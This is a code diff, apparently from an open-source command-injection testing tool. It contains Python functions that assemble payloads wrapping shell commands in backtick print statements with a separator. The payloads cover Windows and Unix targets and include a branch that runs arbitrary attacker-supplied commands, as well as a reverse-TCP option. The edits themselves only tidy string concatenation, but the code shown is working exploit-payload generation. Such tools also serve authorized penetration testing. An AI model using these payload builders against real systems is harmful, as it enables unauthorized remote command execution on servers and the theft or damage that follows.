@@ -36,11 +36,11 @@ def decision(separator, TAG, randv1, randv2):
                   separator
                 )
     else:
-      payload = ("print(`echo " + TAG + "" +
+      payload = ("print(`echo " + TAG +
                   separator + "for /f \"delims=\" %i in ('cmd /c \"" + 
                   "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
-                  "\"') do @set /p =%i <nul" + "" + 
-                  separator + "echo " + TAG + "" +
+                  "\"') do @set /p =%i <nul" + 
+                  separator + "echo " + TAG +
                   separator + "echo " + TAG + "`)%3B"
                 )
   else:
@@ -52,9 +52,9 @@ def decision(separator, TAG, randv1, randv2):
                   separator
                 )
     else:
-      payload = ("print(`echo " + TAG + "" +
-                  separator + "echo $((" + str(randv1) + "%2B" + str(randv2) + "))" + "" +
-                  separator + "echo " + TAG + "" +
+      payload = ("print(`echo " + TAG +
+                  separator + "echo $((" + str(randv1) + "%2B" + str(randv2) + "))" +
+                  separator + "echo " + TAG +
                   separator + "echo " + TAG + "`)%3B"
                 )
       
@@ -74,9 +74,9 @@ def decision_alter_shell(separator, TAG, randv1, randv2):
                   separator
                 )
     else:
-      payload = ("print(`echo " + TAG + "" +
-                  separator + python_payload + 
-                  separator + "echo " + TAG + "" +
+      payload = ("print(`echo " + TAG +
+                  separator +python_payload + 
+                  separator + "echo " + TAG +
                   separator + "echo " + TAG + "`)%3B"
                 )
   else:
@@ -89,9 +89,9 @@ def decision_alter_shell(separator, TAG, randv1, randv2):
                   separator
                 )
     else:
-      payload = ("print(`echo " + TAG + "" +
-                  separator + python_payload  +
-                  separator + "echo " + TAG + "" +
+      payload = ("print(`echo " + TAG +
+                  separator +python_payload  +
+                  separator + "echo " + TAG +
                   separator + "echo " + TAG + "`)%3B"
                 )
       
@@ -132,7 +132,7 @@ def cmd_execution(separator, TAG, cmd):
     else:
       payload = ("print(`echo '" + TAG + "'" + 
                   separator + "echo '" + TAG + "'" +
-                  separator + cmd  +
+                  separator +cmd  +
                   separator + "echo '" + TAG + "'" +
                   separator + "echo '" + TAG + "'`)%3B"
                 )
@@ -145,7 +145,7 @@ __Warning__: The alternative shells are still experimental.
 def cmd_execution_alter_shell(separator, TAG, cmd):
   if settings.TARGET_OS == "win":
     if settings.REVERSE_TCP:
-      payload = (separator + cmd + " "
+      payload = (separator +cmd + " "
                 )
     else:
       python_payload = ("for /f \"delims=\" %i in ('cmd /c " + 
@@ -178,7 +178,7 @@ def cmd_execution_alter_shell(separator, TAG, cmd):
     else:
       payload = ("print(`echo '" + TAG + "'" + 
                   separator + "echo '" + TAG + "'" +
-                  separator + cmd  +
+                  separator +cmd  +
                   separator + "echo '" + TAG + "'" +
                   separator + "echo '" + TAG + "'`)%3B"
                 )
